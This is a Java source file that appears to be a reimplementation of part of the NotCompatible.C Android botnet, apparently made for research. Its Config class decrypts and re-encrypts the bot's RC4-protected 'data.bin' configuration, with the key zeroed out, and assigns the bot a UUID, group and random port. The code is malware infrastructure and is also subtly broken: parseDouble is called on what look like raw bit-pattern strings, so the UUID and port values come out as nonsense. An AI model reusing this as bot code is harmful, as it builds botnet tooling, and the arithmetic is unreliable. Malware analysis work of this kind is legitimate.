package diff.notcompatible.c.bot.objects;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import diff.notcompatible.c.bot.crypto.RC4;

// "Config packet"
public class Config {

    public Packet packet;
    public File directory;

    public Config(File sessionDirectory) {
        directory = sessionDirectory;
    }

    // Saves a "data.bin"
    public void save(File path) {
        try {
            // "generate key"
            byte[] key = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, };

            byte[] cryptedConfig = new RC4(key).crypt(packet.pack());
            DataOutputStream file = new DataOutputStream(new FileOutputStream(directory.getPath() + "/data.bin"));
            file.write(cryptedConfig);
            file.flush();
            file.close();
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    // Loads a "config packet"
    // This normally loads "data.bin" in current location - otherwise load the "data" from "res/raw"
    public void load() {
        boolean isChanged = false;
        try {
            File config = new File(directory.getPath() + "/data.bin");
            if (!config.exists()) {
                config = new File("resources/default.config");
            }

            InputStream fi = new FileInputStream(config);

            byte buffer[] = new byte[fi.available()];

            DataInputStream dis = new DataInputStream(fi);
            dis.read(buffer);
            dis.close();

            // "generate key"
            byte[] key = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,
                            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, };

            RC4 rc4 = new RC4(key);
            byte[] buffer2 = rc4.crypt(buffer);

            MyBuffer mb = new MyBuffer();
            mb.put(buffer2);
            packet = Packet.unpack(mb);

            // No UUID, generate one
            if (packet.getByName("UUID") == null) {
                byte[] uid = new byte[16];
                for (int i = 0; i < uid.length; i++) {
                    uid[i] = (byte) ((int) (Math.random() * Double.parseDouble("4643211215818981376")));
                }

                Packet uuid = packet.add();
                uuid.tag = "UUID";
                uuid.buffer.put(uid);
                isChanged = true;
            }

            // No group - make one
            if (packet.getByName("GROUP") == null) {
                // Odd but the local var is named port for group...
                Packet port = packet.add();
                port.tag = "GROUP";
                port.buffer.putWord(0);
                isChanged = true;
            }

            // No port - make one
            if (packet.getByName("PORT") == null) {
                int portn = (int) (Double.parseDouble("4656722014701092864") * Math.random() * Double
                                .parseDouble("4675043176954724352"));
                Packet port = packet.add();
                port.tag = "PORT";
                port.buffer.putWord(portn);
                isChanged = true;
            }

            dis.close();
            fi.close();

            if (isChanged) {
                save(new File(directory.getPath()));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
